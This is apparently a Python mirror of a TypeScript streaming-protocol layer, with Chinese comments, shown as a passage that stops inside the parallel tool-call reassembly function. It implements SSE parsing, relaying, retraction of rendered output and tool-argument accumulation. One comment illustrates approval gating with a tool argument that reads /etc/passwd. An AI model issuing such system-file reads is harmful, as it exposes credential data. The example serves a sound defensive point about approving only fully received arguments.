"""L16 协议层参考实现的 Python 镜像。与 shared/wire.ts **逐字节等价**。

为什么这一层有 Python 镜像、而 L16 的界面没有：

    界面是 React，镜像一份 Python 的 React 没有意义。
    但 SSE 分帧、撤回状态机、流式 JSON 累积、并行事件归位这四件事
    **和语言无关**——它们是协议和状态机，不是 UI。

而这一层恰好也是唯一能确定性测试的部分。所以两边各一份不是形式主义：
verify 在两种语言上跑同一批断言，任何一边的实现漂移都会立刻暴露。

四处 Python 和 JS 行为不同、必须显式对齐的地方（下面标了 ⚑）：

    json.loads 接受 NaN / Infinity，JSON.parse 拒绝
    re 的 \\d 匹配 Unicode 数字，JS 的 [0-9] 不
    urlparse 对相对 URL 不抛异常，new URL 会抛
    str.startswith 元组形式比正则快，但要保持判断顺序一致
"""

from __future__ import annotations

import codecs
import json
import re
from dataclasses import dataclass, field, replace
from typing import Any, Literal
from urllib.parse import urlparse

# ═══════════════════════════════════════════════════════════════════
# 一、SSE 帧解析
# ═══════════════════════════════════════════════════════════════════


@dataclass(frozen=True)
class SseEvent:
    """`event:` 字段的默认值是 "message"，不是空串。"""

    type: str
    data: str
    #: 派发这个事件时的 last event ID（不是本事件带的 id）
    last_event_id: str


#: ⚑ 用 [0-9] 而不是 \d。Python 的 \d 会匹配阿拉伯-印度数字等 Unicode 数字，
#: 那样 `retry: ٣٠٠٠` 在 Python 侧会生效而在 TS 侧静默失效——两边就不一致了。
_ASCII_DIGITS = re.compile(r"[0-9]+")


class SseParser:
    """符合 WHATWG「event stream」解析算法的增量解析器。

    ★ 为什么必须自己写一遍：你用 SDK 时没遇到这些坑，是因为 SDK 内部替你做了缓冲。
    但当你把这个流从**你自己的服务端**转发给浏览器时，你在那一层重新面对它。

    而且这不是理论风险。Anthropic 的 SDK 真实修过这个 bug：CDN 把一个 SSE 帧
    切开，导致某一块里 `data:` 行缺失，下游对空字符串做 JSON 解析直接崩。
    """

    def __init__(self) -> None:
        #: 还没凑成完整行的残留。这一个字段就是 L02 欠条二的解药。
        self._buf = ""
        #: ★ 已经消费到哪个下标。
        #:
        #: 这里用偏移量而不是每取一行就 `self._buf = self._buf[i:]`，是因为后者是
        #: **二次方**的：每行都要复制一次剩余缓冲。在一个几千个事件的长回答上，
        #: 那个切片的总开销会超过解析本身——而它的症状是「越到后面越卡」，
        #: 很容易被错怪到渲染上。
        self._pos = 0
        self._data_buf = ""
        self._type_buf = ""
        #: ★ last event ID 是**跨事件保持**的，不随每个事件重置
        self._last_event_id = ""
        self._retry_ms: int | None = None
        self._saw_bom = False
        #: 上一块是否以 \r 结尾——用来判断跨块的 \r\n 不要当成两个换行
        self._pending_cr = False

    @property
    def reconnection_time_ms(self) -> int | None:
        return self._retry_ms

    def feed(self, chunk: str) -> list[SseEvent]:
        """喂一块数据，拿回这一块里**已经完整**的事件。"""
        if not self._saw_bom:
            self._saw_bom = True
            # ★ 只剥**第一个**字符位置上的 BOM，而且只剥一次。
            # 流中间出现的 U+FEFF 是正常内容。
            if chunk.startswith("\ufeff"):
                chunk = chunk[1:]

        self._buf += chunk
        out: list[SseEvent] = []

        while True:
            line = self._take_line()
            if line is None:
                break
            ev = self._process_line(line)
            if ev is not None:
                out.append(ev)

        # 每块结束时压缩一次，把偏移量归零。整体是 O(总字节数)。
        if self._pos > 0:
            self._buf = self._buf[self._pos :]
            self._pos = 0
        return out

    def end(self) -> None:
        """流结束了。

        ★★ 注意它**什么都不返回**：规范明确规定，流末尾那个没有以空行收尾的
        事件要被**直接丢弃**。

        这一条是「必须区分流正常结束和流断了」在传输层的镜像——一个把残留缓冲
        也 flush 出去的解析器，会把半个事件当成完整事件交给上层，
        而上层没有任何办法发现这件事。
        """
        self._buf = ""
        self._pos = 0
        self._data_buf = ""
        self._type_buf = ""
        self._pending_cr = False

    def _take_line(self) -> str | None:
        """取出一个完整行；取不到（没遇到行结束符）返回 None。"""
        buf = self._buf
        n = len(buf)

        # ★★ 跨块的 CRLF：上一块以 \r 结尾时我们已经把它当成行结束符了，
        # 所以这一块开头如果是 \n，它属于**上一个**结束符，要吃掉。
        # 漏掉这一步会凭空多出一个空行，也就是凭空多派发一个事件。
        if self._pending_cr and self._pos < n:
            self._pending_cr = False
            if buf[self._pos] == "\n":
                self._pos += 1

        # ★ 规范允许三种行结束符：CRLF、LF、CR。只处理 \n 的解析器，
        # 在一个用 \r 的服务端面前会把整个流当成一行。
        i = self._pos
        while i < n:
            c = buf[i]
            if c == "\n":
                line = buf[self._pos : i]
                self._pos = i + 1
                return line
            if c == "\r":
                line = buf[self._pos : i]
                if i + 1 < n:
                    # 同一块里就能看到下一个字符，直接判断
                    self._pos = i + 2 if buf[i + 1] == "\n" else i + 1
                else:
                    # \r 正好在块尾：先当成结束符，记住下一块开头的 \n 要吃掉
                    self._pos = i + 1
                    self._pending_cr = True
                return line
            i += 1
        return None

    def _process_line(self, line: str) -> SseEvent | None:
        # 空行 → 派发
        if line == "":
            return self._dispatch()

        # ★ 以冒号开头的是注释，整行忽略。
        # 它的正经用途是保活——规范正文里就写着用注释行防止连接超时，
        # 建议间隔约 15 秒。所以你的解析器必须**安静地**忽略它，
        # 而不是当成一个 data 为空的事件。
        if line.startswith(":"):
            return None

        colon = line.find(":")
        if colon == -1:
            # ★ 没有冒号的整行是字段名，值为空串。`data` 单独一行是合法的。
            name, value = line, ""
        else:
            name, value = line[:colon], line[colon + 1 :]
            # ★★ 只忽略**一个**前导空格。`data:  x` 的值是 " x"（带一个空格），
            # 不是 "x"。用 lstrip() 的实现会悄悄改掉用户的内容。
            if value.startswith(" "):
                value = value[1:]

        if name == "event":
            self._type_buf = value
        elif name == "data":
            # ★ 多个 data 行用 \n 连接。这里先无条件追加 \n，派发时再去掉末尾那个。
            self._data_buf += value + "\n"
        elif name == "id":
            # ★ 含 U+0000 的 id 整个字段忽略。
            # 而**空的** id 是合法的，它把 last event ID 重置成空串——
            # 这是服务端主动说「别再带 Last-Event-ID 了」的唯一方式。
            if "\u0000" not in value:
                self._last_event_id = value
        elif name == "retry":
            # ★ 只接受纯 ASCII 数字，否则**静默失效**。
            # `retry: 3000ms` 不会报错，只是什么都不做。
            if value and _ASCII_DIGITS.fullmatch(value):
                self._retry_ms = int(value)
        # ★ 其余字段忽略。这是协议的前向兼容机制，不是可以省掉的分支——
        # Anthropic 会在流里插入任意数量的 ping 事件，
        # 官方要求客户端优雅处理未知事件类型。
        return None

    def _dispatch(self) -> SseEvent | None:
        # ★★ 顺序很重要：last event ID 的更新**发生在**「data 是否为空」的判断之前。
        # 也就是说一个只有 `id:` 的事件（data 为空）不会被派发，
        # 但它**确实**改变了 last event ID。
        ident = self._last_event_id

        if self._data_buf == "":
            # data 为空不派发，但 event type 要清掉
            self._type_buf = ""
            return None

        data = self._data_buf
        if data.endswith("\n"):
            data = data[:-1]

        # ★ 规范的默认事件类型是 "message"，不是空串
        type_ = "message" if self._type_buf == "" else self._type_buf

        self._data_buf = ""
        self._type_buf = ""
        return SseEvent(type=type_, data=data, last_event_id=ident)


def parse_all(chunks: list[str]) -> list[SseEvent]:
    """把一批块喂进一个解析器，返回全部事件。"""
    p = SseParser()
    out: list[SseEvent] = []
    for c in chunks:
        out.extend(p.feed(c))
    p.end()
    return out


class Utf8Stream:
    """增量 UTF-8 解码。★★ 这一层在 SseParser **之前**，而且漏掉它的后果很丑。

    规范规定 event stream 永远按 UTF-8 解码。而网络给你的是**字节**，
    字节边界和字符边界没有任何关系——一个中文字符占三字节，
    它完全可能被切在第二个字节上。

    于是这个写法是错的::

        for chunk in resp.iter_content():
            parser.feed(chunk.decode("utf-8"))    # ← bug

    每块独立解码，等于告诉解码器「这一块就是完整的输入」。
    被切断的那个字符在 Python 里会直接抛 UnicodeDecodeError
    （JS 那边更阴，会静默变成 U+FFFD 也就是 �）。

    症状是中文/emoji 偶发乱码或偶发异常，而且只在特定长度的回答上出现，
    因为它取决于 TCP 分片恰好落在哪里。这类 bug 在本地几乎测不出来。

    正确做法是**一个长期存在的增量解码器**，它自己会把不完整的尾字节留住。
    """

    def __init__(self) -> None:
        self._dec = codecs.getincrementaldecoder("utf-8")(errors="replace")

    def push(self, data: bytes) -> str:
        """★ `final=False` 是关键：它让解码器保留不完整的尾部，等下一块。"""
        return self._dec.decode(data, False)

    def end(self) -> str:
        """流结束。★ `final=True`，所以残留的不完整字节会变成 �。

        那正是想要的：它是「流断在字符中间」的可见证据，而不是静默丢弃。
        """
        return self._dec.decode(b"", True)


# ═══════════════════════════════════════════════════════════════════
# 二、转发：不许攒，也不许拆坏
# ═══════════════════════════════════════════════════════════════════


@dataclass(frozen=True)
class RelayOut:
    #: 这一次输入产生的输出块。空列表表示「这一块还凑不成一个完整事件」
    emit: list[str]
    #: 还压在手上的字节数。用来证明转发器没有在攒整段
    held: int


class Relay:
    """一个正确的转发器：服务端收到上游的块，重新发给浏览器。

    ★ 它要同时满足两条**互相拉扯**的性质：

        完整性：绝不把一个事件拆成两半发出去（下游会解析半个 JSON）
        及时性：绝不等整段到齐才发（那就不是流了，只是个慢接口）

    naive 实现会犯两类错，而且它们是相反方向的：

        原样转发每个块   —— 及时但会把帧拆坏（上游的块边界和帧边界无关）
        收齐了再一次发   —— 完整但把流变成了阻塞接口

    正确做法是**按帧转发**：攒到完整的帧就立刻发，只把不完整的尾巴留在手上。
    所以 held 永远小于一个帧的长度，而不是小于整段的长度。
    """

    def __init__(self) -> None:
        self._buf = ""

    def push(self, chunk: str) -> RelayOut:
        self._buf += chunk
        emit: list[str] = []

        while True:
            at = find_frame_end(self._buf)
            if at is None:
                break
            emit.append(self._buf[:at])
            self._buf = self._buf[at:]
        return RelayOut(emit=emit, held=len(self._buf))

    def end(self) -> int:
        """流结束。★ 残留的不完整帧**丢弃**，理由和 SseParser.end 一样。返回丢弃字节数。"""
        dropped = len(self._buf)
        self._buf = ""
        return dropped


def find_frame_end(s: str) -> int | None:
    """返回第一个帧结束位置（含结束符），没有完整帧则返回 None。

    ★★ 这个函数是整个转发器里唯一不能偷懒的地方，理由值得单独说。

    「用 `s.find("\\n\\n")` 找边界」是一个**会漏**的实现。因为规范允许三种行结束符
    任意混用，而「空行」= 两个连续的行结束符，所以它有**八种**可分辨的字节组合：

        \\r\\n\\r\\n   \\r\\n\\n   \\r\\n\\r   \\n\\r\\n   \\n\\n   \\n\\r   \\r\\r\\n   \\r\\r

    （CR 后面跟 LF 那一种不算，因为它就是一个 CRLF，不是两个结束符。）

    一个只找 `\\n\\n` 的转发器会在混用的流上**永远找不到边界**，于是一路攒到流结束——
    表现是「流式接口能用，但一点都不流」，而且日志全绿。

    所以这里不去搜分隔符，而是**按行切**：逐个吃掉行结束符，遇到空行就是帧尾。

    ★ 有一处一字节的含糊：如果缓冲正好在 `\\r` 处结束，我们无法知道下一块是不是
    以 `\\n` 开头。这里选择在 `\\r` 处切开，那个 `\\n` 归下一帧。这是**安全的**——
    切点只影响字节什么时候被冲出去，不影响冲出去的是哪些字节，
    而下游多看到一个开头的空行只会得到一次「data 为空、不派发」。
    """
    line_start = 0
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c == "\n":
            term_end = i + 1
        elif c == "\r":
            term_end = i + 2 if (i + 1 < n and s[i + 1] == "\n") else i + 1
        else:
            i += 1
            continue
        # 这一行是空行 → 帧在这里结束
        if i == line_start:
            return term_end
        line_start = term_end
        i = term_end
    return None


def relay_frames(chunks: list[str]) -> list[str]:
    """转发一整条流，返回输出块序列。

    ★ 这个函数存在的唯一目的是让下面这条性质可以被断言：
    **无论输入被怎么切块，输出拼起来必须和输入逐字节相同。**
    verify 里用随机切割点跑一百遍。
    """
    r = Relay()
    out: list[str] = []
    for c in chunks:
        out.extend(r.push(c).emit)
    r.end()
    return out


@dataclass(frozen=True)
class RelayStat:
    #: 转发器吐出的块数
    emitted: int
    #: 这条流本来有多少个事件
    want_events: int
    #: 一个 naive 下游能解析出多少个
    naive_events: int
    #: naive 下游崩了几次
    naive_crashes: int
    naive_ok: bool
    #: 输出拼起来是否和输入逐字节相同
    bytewise: bool


def chop_relay(chunks: list[str], by_frame: bool) -> RelayStat:
    """把一串块转发给一个**naive 下游**，看它能不能活。

    ★★ 这个函数存在的意义是把「转发不是搬运」变成一个可以运行的对照实验。

    naive 下游 = 对每一块直接解析 data 行。很多人第一版就这么写，
    而且在本地一定能过——因为本地没有那个会重新分帧的中间层。

    ★ 注意一件事：如果下游是一个**有状态**的解析器，转发器怎么切都无所谓，
    因为它看到的是同一串字节。所以按帧转发的真正价值是**防御性的**：
    它让一个写错的下游也能正常工作。而你通常没法控制下游怎么写
    （那可能是别人的浏览器里的一段代码，或者一个第三方 SDK）。
    """
    src = "".join(chunks)
    out = relay_frames(chunks) if by_frame else list(chunks)

    naive_events = naive_crashes = 0
    for c in out:
        for line in c.split("\n"):
            if not line.startswith("data:"):
                continue
            try:
                json.loads(line[5:].strip())
                naive_events += 1
            except ValueError:
                naive_crashes += 1

    want_events = len(parse_all([src]))
    return RelayStat(
        emitted=len(out),
        want_events=want_events,
        naive_events=naive_events,
        naive_crashes=naive_crashes,
        naive_ok=naive_events == want_events and naive_crashes == 0,
        # ★ 按帧转发会丢掉末尾不完整的帧（和解析器 end() 同一个理由），
        # 所以这里比较的是「输出是输入的前缀」而不是完全相等。
        bytewise=src.startswith("".join(out)),
    )


# ═══════════════════════════════════════════════════════════════════
# 三、视图模型与「撤回已渲染内容」
# ═══════════════════════════════════════════════════════════════════

PartKind = Literal["text", "reasoning", "tool"]
Status = Literal["streaming", "done", "aborted", "failed"]


@dataclass(frozen=True)
class Part:
    kind: PartKind
    #: 同一个 id 的后续 delta 追加到同一个 part 上
    id: str
    text: str
    #: 这个 part 是在第几个 step 里产生的。reset-step 靠它定位
    step: int
    tool_name: str | None = None
    #: tool part 才有。四个状态见 ArgsState——**不是**「好了/没好」两态
    args: ArgsState | None = None


@dataclass(frozen=True)
class Chunk:
    """线协议上的一个 chunk。

    ★★ `reset-step` 是 L02 欠条一在真实线协议里的对应物，见 apply_chunk 的注释。
    """

    type: str
    id: str = ""
    delta: str = ""
    tool_name: str = ""
    reason: str = ""
    message: str = ""
    #: ⚑ 对应 TS 侧的 UnknownChunk：协议**必须**容忍它不认识的字段。
    #: 「严格校验、遇到未知字段就报错」在普通前端里是美德，在流式协议里是 bug。
    #: AI SDK 的 chunk schema 每个 variant 都用宽松对象，这是有意的前向兼容设计；
    #: Anthropic 把它写成了明文规定——新事件类型可能随时加进来。
    #: 现实后果：OpenAI 加了个 `obfuscation` 字段之后，严格校验的客户端直接挂了。
    extra: dict[str, Any] = field(default_factory=dict)


@dataclass(frozen=True)
class View:
    parts: list[Part] = field(default_factory=list)
    step: int = 0
    status: Status = "streaming"
    #: aborted / failed 时的原因
    reason: str | None = None
    #: 累计撤回过多少个 part。审计用——它不该在正常运行里增长
    retracted: int = 0


def empty_view() -> View:
    return View()


def apply_chunk(v: View, c: Chunk) -> View:
    """把一个 chunk 应用到视图模型上。纯函数，返回新的 View。

    ★★ reset-step 是这一节的核心，值得说清楚它为什么必须存在于**协议层**
    而不是「前端自己想办法」。

    L02 讲过：流式打破了「成功和失败互斥」这个假设。HTTP 头已经发出去了，
    所以服务端只能在流**内部**报错——而这时你可能已经把半段文字渲染到屏幕上了。
    L02 当时给的结论是：重试不保留那半段，重发整个请求，前端丢弃已渲染的部分。

    问题是「丢弃已渲染的部分」需要知道**丢弃到哪里为止**。而这个边界前端自己是
    算不出来的：它不知道服务端是在第一次尝试里失败的、还是已经成功了半个 step
    又在下一个 step 失败的。

    所以它必须是服务端发过来的一个**显式信号**。Vercel AI SDK 的线协议里就有
    这个 chunk，官方描述是「removes all message parts added during the current
    step」，用途是「invalidate partial output from a failed streamed step
    before replacement output arrives」。

    也就是说：**这不是一个我编的设计，是一个已经在生产协议里的东西。**
    """
    parts = list(v.parts)

    # ★★ abort / failed 之后是**终态**。后到的内容块要丢掉。
    #
    # 这一条不是洁癖：用户点了停止之后，管线里可能还有已经在路上的 delta。
    # 一个继续 append 的实现会在用户按下停止之后**还往屏幕上写字**，
    # 而这是所有「停止按钮好像没用」的投诉里最常见的那个原因。
    if v.status in ("aborted", "failed") and c.type not in ("abort", "error"):
        return v

    if c.type == "start-step":
        return replace(v, step=v.step + 1)

    # ★ finish-step 结束的是**一个 step**，不是整条消息。一条消息可以有多个
    # step（每次工具调用一轮）。所以它不改 status——终态由 stop-reason 决定。
    if c.type == "finish-step":
        return v

    if c.type == "reset-step":
        # ★ 只删**当前 step** 的 part。更早的 step 是已经成功的内容，
        # 把它们一起删掉就等于把成功的输出也丢了。
        kept = [p for p in parts if p.step != v.step]
        return replace(v, parts=kept, retracted=v.retracted + (len(parts) - len(kept)))

    if c.type in ("text-delta", "reasoning-delta"):
        kind: PartKind = "text" if c.type == "text-delta" else "reasoning"
        idx = next((i for i, p in enumerate(parts) if p.id == c.id and p.kind == kind), -1)
        if idx == -1:
            parts.append(Part(kind=kind, id=c.id, text=c.delta, step=v.step))
        else:
            parts[idx] = replace(parts[idx], text=parts[idx].text + c.delta)
        return replace(v, parts=parts)

    if c.type == "tool-input-start":
        parts.append(
            Part(
                kind="tool",
                id=c.id,
                tool_name=c.tool_name,
                text="",
                args="streaming",
                step=v.step,
            )
        )
        return replace(v, parts=parts)

    if c.type == "tool-input-delta":
        idx = next((i for i, p in enumerate(parts) if p.id == c.id and p.kind == "tool"), -1)
        # ★ 收到 delta 但没有对应的 start，说明事件乱序或丢了。
        # 静默创建一个 part 会掩盖这件事，所以这里抛错。
        if idx == -1:
            raise ValueError(f"tool-input-delta 找不到对应的 part：{c.id}")
        parts[idx] = replace(parts[idx], text=parts[idx].text + c.delta)
        return replace(v, parts=parts)

    if c.type == "tool-input-end":
        idx = next((i for i, p in enumerate(parts) if p.id == c.id and p.kind == "tool"), -1)
        if idx == -1:
            raise ValueError(f"tool-input-end 找不到对应的 part：{c.id}")
        # ★ 到这里参数才算收完。但**收完不等于可执行**：字符串仍然可能不是
        # 合法 JSON。所以这里只判 ready / invalid，理由见 JsonAccumulator。
        raw = parts[idx].text
        state: ArgsState = "ready"
        if raw != "":
            try:
                json.loads(raw, parse_constant=_reject_constant)
            except (ValueError, TypeError):
                state = "invalid"
        parts[idx] = replace(parts[idx], args=state)
        return replace(v, parts=parts)

    if c.type == "stop-reason":
        if c.reason != "max_tokens":
            return replace(v, status="done")
        # ★★ max_tokens 会在**参数中间**把响应切断。
        #
        # 官方明文说这时候的正确动作是提高 max_tokens 重试，而**不是**修补那个
        # 半截参数——修补等于替模型猜它想干什么。所以这里把没收完的工具调用
        # 直接撤回，而不是留在屏幕上让用户以为它还能点。
        #
        # 这是 reset-step 之外**第二条**通往撤回的路径，而它比 reset-step 更容易
        # 漏：流是正常结束的，HTTP 200，没有任何错误事件。
        kept = [p for p in parts if not (p.kind == "tool" and p.args == "streaming")]
        return replace(
            v,
            parts=kept,
            status="done",
            reason="max_tokens 在参数中途截断",
            retracted=v.retracted + (len(parts) - len(kept)),
        )

    if c.type == "abort":
        return replace(v, status="aborted", reason=c.reason)

    if c.type == "error":
        return replace(v, status="failed", reason=c.message)

    # ★★ 未知的 chunk 类型**静默忽略**，理由见 Chunk.extra 的注释。
    # 这里 return v 而不是 raise，是整个文件里唯一一处
    # 「不报错」比「报错」更正确的地方。
    return v


def apply_all(chunks: list[Chunk], from_: View | None = None) -> View:
    v = empty_view() if from_ is None else from_
    for c in chunks:
        v = apply_chunk(v, c)
    return v


def visible_text(v: View) -> str:
    """只取给用户看的正文。★ 参数还没收完的工具调用不算。"""
    return "".join(p.text for p in v.parts if p.kind == "text")


# ═══════════════════════════════════════════════════════════════════
# 四、被截断的消息能不能放回历史
# ═══════════════════════════════════════════════════════════════════


@dataclass(frozen=True)
class ResumeCheck:
    ok: bool
    reason: str
    #: 可以安全回传的 part 下标（含）。-1 表示一个都不能带
    safe_up_to: int


def check_resumable(v: View) -> ResumeCheck:
    """用户点了停止，或者流断了。这半截 assistant 消息能不能放回历史里接着续？

    ★★ 这里有一个 2026 年的反转，而且方向和「经典做法」完全相反。

    「把半截 assistant 消息放回去让模型接着写」这个技巧（prefill / 续写）
    在 Claude 4.6 及以后**直接返回 400**，不是降级，是报错。
    恢复中断的流现在要改用一条 **user** 消息来表达。

    而且不是所有块都能带回去：

        text 块       —— 最后一个**完整的** text 块之前都可以
        tool_use 块   —— 不能部分恢复
        thinking 块   —— 不能部分恢复，而且必须原样回传，改一个字就是 400

    thinking 那条格外阴：它意味着**客户端做上下文压缩会打掉 thinking 块**
    （某些模型上有前缀绑定校验）。这条直接咬 L06。

    所以这个函数的职责是**拦住**一个很自然的想法，而不是实现它。
    """
    if v.status == "streaming":
        return ResumeCheck(ok=False, reason="流还没结束，现在判断还早", safe_up_to=-1)

    # 参数没收完或收完了但不合法的工具调用：不能部分恢复
    bad_tool = next(
        (i for i, p in enumerate(v.parts) if p.kind == "tool" and p.args != "ready"), -1
    )
    if bad_tool != -1:
        return ResumeCheck(
            ok=False,
            reason=(
                "有一个工具调用的参数只收到一半。tool_use 块不能部分恢复——"
                "把半个 JSON 放回历史，模型下一轮会拿到一个它没法解析的参数"
            ),
            safe_up_to=bad_tool - 1,
        )

    if any(p.kind == "reasoning" for p in v.parts):
        return ResumeCheck(
            ok=False,
            reason=(
                "thinking 块必须原样回传且不能部分恢复。被截断的那一段没法原样回传，"
                "改一个字就是 400"
            ),
            safe_up_to=-1,
        )

    last_text = -1
    for i, p in enumerate(v.parts):
        if p.kind == "text":
            last_text = i
    if last_text == -1:
        return ResumeCheck(ok=False, reason="没有任何完整的 text 块可以接续", safe_up_to=-1)

    return ResumeCheck(
        ok=False,
        reason=(
            "内容上可以从最后一个完整 text 块处恢复，但**不要用 prefill**："
            "Claude 4.6 及以后对 assistant 预填返回 400。"
            "改成用一条 user 消息表达「接着上面继续」"
        ),
        safe_up_to=last_text,
    )


# ═══════════════════════════════════════════════════════════════════
# 五、流式工具参数：什么时候能给用户看
# ═══════════════════════════════════════════════════════════════════


#: 参数累积的状态。★★ 四个状态，而不是「好了/没好」两个。
#:
#: `truncated` 是最容易漏的一个：`max_tokens` 会在**参数中间**把响应切断。
#: 官方明文说这时候不能执行，只能提高 max_tokens 重试或者修补参数。
#: 一个只有「合法/非法」两态的实现会把它归到「非法」，于是走上修补的路——
#: 而正确的动作是重试。
ArgsState = Literal["streaming", "ready", "invalid", "truncated"]


@dataclass(frozen=True)
class Accumulated:
    state: ArgsState
    #: ★ 累积到现在的原始字符串。**这个可以展示**——官方 SDK 就是把它作为
    #: snapshot 吐出来的（`event.snapshot` → `'{"message": "Hello, there"'`）。
    snapshot: str
    #: 解析成功时的值；其余情况是 None
    value: Any
    #: ★ 解析失败时，官方的做法不是丢掉，而是把原始字符串包进一个
    #: INVALID_JSON 字段回传给模型，让它自己看到自己吐了什么。
    invalid_json: str | None
    #: ★★ **能不能执行**。注意它和「能不能展示」是两件事——
    #: 这是本节最容易合并错的一处边界，见 JsonAccumulator 的注释。
    can_execute: bool


def invalid_json_payload(raw: str) -> str:
    """把一个非法参数包成可以回传给模型的 tool result。

    ★ 官方特别交代了一句：**用 JSON 库构造这个包装，不要拼字符串。**
    理由很实际——非法的参数里几乎一定有引号（那通常就是它非法的原因），
    拼字符串会让包装本身也变成非法 JSON，于是你把一个解析错误
    变成了两个，而且第二个发生在你自己的代码里。
    """
    return json.dumps({"INVALID_JSON": raw}, ensure_ascii=False, separators=(",", ":"))


def _reject_constant(name: str) -> Any:
    """⚑ json.loads 默认接受 NaN / Infinity / -Infinity，而 JSON.parse 拒绝它们。

    不对齐这一条，同一个工具参数在 Python 侧解析成功、TS 侧解析失败——
    而这门课要求两边逐字节一致。
    """
    raise ValueError(f"JSON.parse 不接受 {name}")


class JsonAccumulator:
    """流式工具参数的累积器。

    ★★ 这里有两个会让人意外的地方。

    **第一个：默认情况下你根本看不到「半个参数」。**
    非 fine-grained 模式下，模型一次发送一个**完整的键值对**。
    想看到真正半截的 JSON 流，得显式开 eager input streaming。
    所以「工具参数是逐字符流过来的」这个印象，对默认配置是错的。

    **第二个：开了 fine-grained 之后，累积出来的字符串不保证是合法 JSON。**
    不是「中途不合法、最后合法」——是**最后也可能不合法**。

    还有一个类型上的坑：Anthropic 的 content_block_start 里 `tool_use.input`
    是一个**空对象** `{}`，而后续的 delta 是**字符串**。
    一个按 input 的类型去累积的实现，会在第一个 delta 上就类型错。
    """

    def __init__(self) -> None:
        self._raw = ""
        self._closed = False
        self._cut_off = False

    def push(self, delta: str) -> None:
        if self._closed:
            raise ValueError("已经 stop 过了，不该再收到 delta")
        self._raw += delta

    def close(self) -> None:
        """对应 content_block_stop。★ 只有它之后 can_execute 才**可能**为 True。"""
        self._closed = True

    def truncate(self) -> None:
        """对应 `stop_reason == "max_tokens"`。

        ★ 它和 close 是不同的结束方式，而且结论相反：close 之后可能可执行，
        这个之后**一定不可执行**。
        """
        self._closed = True
        self._cut_off = True

    def get(self) -> Accumulated:
        # ★★ 这里是本节最容易合并错的一条边界，值得把两件事拆开说。
        #
        # **能展示** 和 **能执行** 不是一回事。
        #
        # 官方 SDK 在每个 delta 上都吐一个 snapshot（累积到现在的原始字符串），
        # 明确是给你展示用的——所以「参数正在流入」这个进度是可以画出来的。
        #
        # 但**执行**的唯一安全点是 content_block_stop。而这条边界之所以是安全
        # 边界而不是体验偏好：一个半截的
        #   {"path": "/etc/pass
        # 在审批界面上会被读成「要读 /etc/pass」，而完整的参数可能是
        #   {"path": "/etc/passwd", "dryRun": true}
        # 反过来也成立——半截的参数可能看起来无害，补全之后才危险。
        #
        # 所以结论不是「不许展示」，而是：**审批必须卡在 can_execute 上，
        # 不能卡在 snapshot 上。** 让用户对一个还没成形的动作点「允许」，
        # 是把 L14 那一整节的努力白费掉的最快方式。
        if not self._closed:
            return Accumulated(
                state="streaming",
                snapshot=self._raw,
                value=None,
                invalid_json=None,
                can_execute=False,
            )

        if self._cut_off:
            # ★ 被 max_tokens 切断。官方说这时候的正确动作是**提高 max_tokens 重试**，
            # 而不是去修补这个半截参数——修补等于替模型猜它想干什么。
            return Accumulated(
                state="truncated",
                snapshot=self._raw,
                value=None,
                invalid_json=None,
                can_execute=False,
            )

        # ★ 零 delta 是合法的，结果是空对象而不是解析错误。
        # 这种块在 Anthropic 的流里有明确含义，见 reassemble 的注释。
        if self._raw == "":
            return Accumulated(
                state="ready", snapshot="", value={}, invalid_json=None, can_execute=True
            )

        try:
            value = json.loads(
                self._raw,
                parse_constant=_reject_constant,  # ⚑ 见上面
            )
        except (ValueError, TypeError):
            # ★ 注意「收到了 stop」并不保证字符串合法。官方原话是
            # the accumulated string might not be valid JSON——不是「中途不合法」，
            # 是**最后也可能不合法**。
            return Accumulated(
                state="invalid",
                snapshot=self._raw,
                value=None,
                invalid_json=self._raw,
                can_execute=False,
            )
        return Accumulated(
            state="ready", snapshot=self._raw, value=value, invalid_json=None, can_execute=True
        )


# ═══════════════════════════════════════════════════════════════════
# 六、并行工具调用的事件归位
# ═══════════════════════════════════════════════════════════════════


@dataclass(frozen=True)
class RawToolEvent:
    #: 全局单调序号。乱序到达时靠它排
    seq: int
    #: 同一个工具调用的事件共享它
    item_id: str
    #: 这个工具调用在输出里的位置
    output_index: int
    phase: Literal["start", "delta", "stop"]
    tool_name: str = ""
    delta: str = ""


@dataclass(frozen=True)
class ToolCall:
    item_id: str
    output_index: int
    tool_name: str
    args: Accumulated


@dataclass(frozen=True)
class Reassembled:
    calls: list[ToolCall]
    #: ★★ 零 delta 的空块。它**不是**一个工具调用。
    #:
    #: Anthropic 的流在服务端**中途换模型**时，会在每个模型边界插入一个
    #: 只有 start 和 stop、中间一条 delta 都没有的块。
    #:
    #: 也就是说「一个流对应一个模型」这个假设是错的——一条流可以由两个模型
    #: 接力写完。如果你的解析器假设「每个块至少有一个 delta」，
    #: 它会在 fallback 发生时静默出错（把这个空块当成一个参数为空的工具调用）。
    #:
    #: 而这件事有 UI 后果：**你可能需要在流中途告诉用户「下面这段是另一个
    #: 模型写的」。** 普通 Web 应用里没有任何对应物。
    model_boundaries: list[int]


def reassemble(events: list[RawToolEvent]) -> Reassembled:
    """把交错到达的工具事件归位成一组工具调用。

    ★ 并行工具调用的事件**会交错**：A 的 delta、B 的 delta、A 的 delta……
    归位靠 item_id / output_index，排序靠全局 seq。

    一个按到达顺序往「当前工具」上追加的实现，会把 B 的参数拼到 A 上。
    而这个 bug 的表现是**两个工具都拿到语法合法但内容串味的参数**——
    不抛异常，日志是绿的，只是 agent 去读了一个它没打算读的文件。

    输出按 output_index 排序，和到达顺序无关。
    """
    # ★ 按全局 seq 排序，不按到达顺序。乱序到达是真实存在的。
    ordered = sorted(events, key=lambda e: e.seq)
    #: item_id → [output_index, tool_name, 累积器, 收到的 delta 条数]
    acc: dict[str, list[Any]] = {}

    for e in ordered:
        if e.phase == "start":
            # ★ 同一个 item_id 收到两次 start 是协议违规，不要覆盖已完成的调用
            if e.item_id in acc:
                raise ValueError(f"同一个 item_id 收到两次 start：{e.item_id}")
            acc[e.item_id] = [e.output_index, e.tool_name, JsonAccumulator(), 0]
            continue

        slot = acc.get(e.item_id)
        # ★ 找不到 slot 就抛错，不要静默新建——那正是「串味」bug 的藏身处
        if slot is None:
            raise ValueError(f"{e.phase} 事件找不到对应的 start：{e.item_id}")

        if e.phase == "delta":
            slot[2].push(e.delta)
            slot[3] += 1
        else:
            slot[2].close()

    calls: list[ToolCall] = []
    boundaries: list[int] = []
    for item_id, (oi, name, j, n_deltas) in acc.items():
        # ★★ 零 delta 的块是模型边界，不是工具调用。见 Reassembled 的注释。
        if n_deltas == 0:
            boundaries.append(oi)
            continue
